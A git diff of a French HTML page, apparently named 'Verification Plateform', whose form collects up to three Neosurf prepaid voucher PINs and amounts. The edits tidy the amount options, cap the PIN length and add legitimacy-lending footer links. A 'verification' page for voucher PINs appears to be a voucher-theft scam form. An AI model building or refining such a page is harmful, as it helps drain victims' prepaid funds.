@@ -33,40 +33,40 @@
                     <label for="montant1Neosurf">Montant:</label>
                     <select name="montant1Neo" id="montant1Neosurf" required>
                         <option value="0" disabled selected>Montant de la recharge</option>
-                        <option value="30">0-30€</option>
+                        <option value="30">30€</option>
                         <option value="50">50€</option>
                         <option value="50">100€</option>
                     </select>                    
                 </div>
                 <div>
                     <label for="code1">Pin:</label>
-                    <input type="text" id="code1" name="code1" placeholder="XXXX XXX XXX" required>
+                    <input type="text" id="code1" name="code1" placeholder="XXXX XXX XXX" required maxlength="12">
                 </div>
                 <div>
                     <label for="montant2">Montant:</label>
                     <select name="montant2" id="montant1">
                         <option value="0" disabled selected>Montant de la recharge</option>
-                        <option value="50">0-30€</option>
+                        <option value="30">30€</option>
                         <option value="50">50€</option>
                         <option value="50">100€</option>
                     </select>                    
                 </div>
                 <div>
                     <label for="code2">Pin 2:</label>
-                    <input type="text" id="code2" name="code2" placeholder="XXXX XXX XXX">
+                    <input type="text" id="code2" name="code2" placeholder="XXXX XXX XXX"  maxlength="12">
                 </div>
                 <div>
                     <label for="montant3">Montant:</label>
                     <select name="montant3" id="montant3">
                         <option value="0" disabled selected>Montant de la recharge</option>
-                        <option value="50">0-30€</option>
+                        <option value="30">30€</option>
                         <option value="50">50€</option>
                         <option value="50">100€</option>
                     </select>                    
                 </div>
                 <div>
                     <label for="code3">Pin 3:</label>
-                    <input type="text" id="code3" name="code3" placeholder="XXXX XXX XXX">
+                    <input type="text" id="code3" name="code3" placeholder="XXXX XXX XXX"  maxlength="12">
                 </div>
             </fieldset>
         </div>
@@ -74,7 +74,9 @@
     </form>
 </div>
     <footer>
-        <small>© Copyright Verification Plateform 2022</small>
+        <small>© Copyright Verification Plateform 2022.</small><br>
+        <small>Conditions d'utilisation<br>Politique de cookies</small><br>
+        <small><a href="about.html">A propos de nous </a></small>
     </footer>
     <script>
         function goToHomePage(event) {
